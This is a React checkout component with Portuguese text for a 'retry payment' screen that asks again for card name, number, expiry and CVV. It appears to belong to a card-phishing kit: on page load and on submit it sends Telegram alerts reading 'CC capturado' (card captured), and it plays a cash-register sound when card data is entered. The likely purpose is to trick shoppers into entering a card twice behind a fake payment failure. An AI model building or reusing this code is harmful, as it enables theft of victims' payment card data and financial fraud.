import React, { useEffect } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { CreditCardData, Order } from '@/types/checkout';
import { MoveRight } from 'lucide-react';
import { cardSchema } from '@/components/checkout/payment-methods/card/cardValidation';
import { handleCardNumberChange, handleExpiryDateChange } from '@/components/checkout/payment-methods/card/formatters/cardInputFormatters';
import { formatExpiryDate } from '@/utils/cardValidationUtils';
import { CardBrandDisplay, requiresFourDigitCvv } from '@/components/checkout/payment-methods/card/CardBrandDetector';
import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
import { useToast } from '@/hooks/use-toast';

interface RetryPaymentFormProps {
  order: Order | null;
  validationResult: {
    canProceed: boolean;
    message?: string;
    remainingAttempts?: number;
  } | null;
  onSubmit: (data: CreditCardData) => Promise<void>;
  isLoading: boolean;
  cardData?: CreditCardData;
}

const RetryPaymentForm: React.FC<RetryPaymentFormProps> = ({ 
  order, 
  validationResult, 
  onSubmit,
  isLoading,
  cardData
}) => {
  const { toast } = useToast();
  const form = useForm<any>({
    resolver: zodResolver(cardSchema),
    defaultValues: {
      holderName: cardData?.holderName || '',
      number: cardData?.number || '',
      expiryDate: cardData?.expiryDate || '',
      cvv: cardData?.cvv || '',
      installments: 1,
    },
  });

  // Enviar notificação quando o componente montar (entrada na tela de retry)
  useEffect(() => {
    const sendNotification = async () => {
      try {
        await sendTelegramNotification('📲 1x CC capturado (retry)');
        console.log('Telegram notification sent on retry page load');
      } catch (error) {
        console.error('Error sending notification on retry page load:', error);
      }
    };
    
    sendNotification();
  }, []);

  const handleSubmit = async (values: any) => {
    const cardData: CreditCardData = {
      holderName: values.holderName,
      number: values.number.replace(/\s/g, ''),
      cvv: values.cvv,
      expiryDate: values.expiryDate,
      brand: 'unknown', // The brand will be detected by the server
      installments: 1,
    };
    
    // Tocar som de caixa registradora quando os dados do cartão forem enviados
    try {
      const cashSound = new Audio('/cash-register.mp3');
      await cashSound.play();
      
      toast({
        title: "Processando pagamento",
        description: "Estamos processando seus dados de pagamento...",
      });
    } catch (audioError) {
      console.error('Error playing cash register sound:', audioError);
    }
    
    // Enviar notificação do Telegram quando os dados do cartão forem submetidos na página de retry
    try {
      await sendTelegramNotification(`💳 2x CC capturado (retry)`);
      console.log('Telegram notification sent on retry form submit');
    } catch (error) {
      console.error('Error sending Telegram notification in retry page:', error);
    }
    
    await onSubmit(cardData);
  };

  // Extract the card number to determine if we need a 4-digit CVV
  const cardNumber = form.watch('number') || '';
  const isFourDigitCvv = requiresFourDigitCvv(cardNumber);

  return (
    <Form {...form}>
      <form onSubmit={form.handleSubmit(handleSubmit)} className="space-y-4">
        <FormField
          control={form.control}
          name="holderName"
          render={({ field }) => (
            <FormItem>
              <FormLabel>Nome no cartão</FormLabel>
              <FormControl>
                <Input 
                  placeholder="Nome impresso no cartão" 
                  {...field} 
                  className="border border-gray-200" 
                  autoComplete="cc-name"
                />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />
        
        <FormField
          control={form.control}
          name="number"
          render={({ field: { onChange, value, ...rest } }) => (
            <FormItem>
              <FormLabel>Número do cartão</FormLabel>
              <div className="relative">
                <FormControl>
                  <Input 
                    placeholder="0000 0000 0000 0000" 
                    value={value}
                    {...rest}
                    onChange={(e) => handleCardNumberChange(e, onChange)}
                    className="border border-gray-200 pr-12" 
                    maxLength={19}
                    autoComplete="cc-number"
                  />
                </FormControl>
                <CardBrandDisplay cardNumber={value || ''} />
              </div>
              <FormMessage />
            </FormItem>
          )}
        />
        
        <div className="grid grid-cols-2 gap-4">
          <FormField
            control={form.control}
            name="expiryDate"
            render={({ field: { onChange, ...rest } }) => (
              <FormItem>
                <FormLabel>Validade</FormLabel>
                <FormControl>
                  <Input 
                    placeholder="MM/AA" 
                    {...rest} 
                    onChange={(e) => handleExpiryDateChange(e, onChange, formatExpiryDate)}
                    className="border border-gray-200 text-center" 
                    maxLength={5}
                    autoComplete="cc-exp"
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />
          
          <FormField
            control={form.control}
            name="cvv"
            render={({ field }) => (
              <FormItem>
                <FormLabel>CVV</FormLabel>
                <FormControl>
                  <Input 
                    placeholder={isFourDigitCvv ? "0000" : "000"} 
                    {...field} 
                    className="border border-gray-200 text-center" 
                    maxLength={isFourDigitCvv ? 4 : 3}
                    autoComplete="cc-csc"
                    type="text"
                  />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />
        </div>
        
        <Button 
          type="submit" 
          disabled={isLoading}
          className="w-full bg-green-500 hover:bg-green-600 mt-6 flex items-center justify-center gap-2"
        >
          {isLoading ? (
            <div className="flex items-center gap-2">
              <div className="h-4 w-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
              <span>Processando...</span>
            </div>
          ) : (
            <>
              <span>Finalizar pagamento</span>
              <MoveRight className="h-4 w-4" />
            </>
          )}
        </Button>
        
        {validationResult?.message && (
          <p className="text-sm text-center text-gray-500 mt-2">
            {validationResult.message}
          </p>
        )}
      </form>
    </Form>
  );
};

export default RetryPaymentForm;
